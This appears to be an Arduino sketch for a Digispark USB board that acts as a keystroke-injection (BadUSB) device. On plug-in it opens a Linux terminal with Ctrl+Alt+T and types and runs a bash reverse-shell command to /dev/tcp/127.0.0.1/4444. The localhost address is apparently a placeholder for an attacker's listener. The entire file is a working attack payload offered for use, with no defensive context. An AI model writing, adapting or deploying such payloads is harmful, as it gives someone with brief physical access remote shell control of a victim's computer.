#include "DigiKeyboard.h"

void setup() {

  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(1000);

  // Press Ctrl + Alt + T to open a terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);

  DigiKeyboard.delay(5000); // Adjust this to your need, mine takes a long time

  DigiKeyboard.print(F("bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"));
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);


}

void loop() {}
